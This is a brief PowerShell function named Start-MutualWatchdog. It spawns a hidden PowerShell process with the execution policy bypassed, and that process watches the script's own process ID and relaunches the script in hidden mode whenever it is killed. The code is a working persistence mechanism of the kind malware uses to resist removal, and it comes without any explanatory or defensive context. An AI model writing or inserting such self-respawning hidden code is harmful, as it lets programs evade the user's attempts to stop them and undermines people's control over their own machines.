function Start-MutualWatchdog {
    $me = $PID
    Start-Process powershell -WindowStyle Hidden -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy Bypass",
        "-Command",
        "while(`$true){ if(-not(Get-Process -Id $me -ErrorAction SilentlyContinue)){ Start-Process '$PSCommandPath' -WindowStyle Hidden; break }; Start-Sleep 2 }"
    )
}
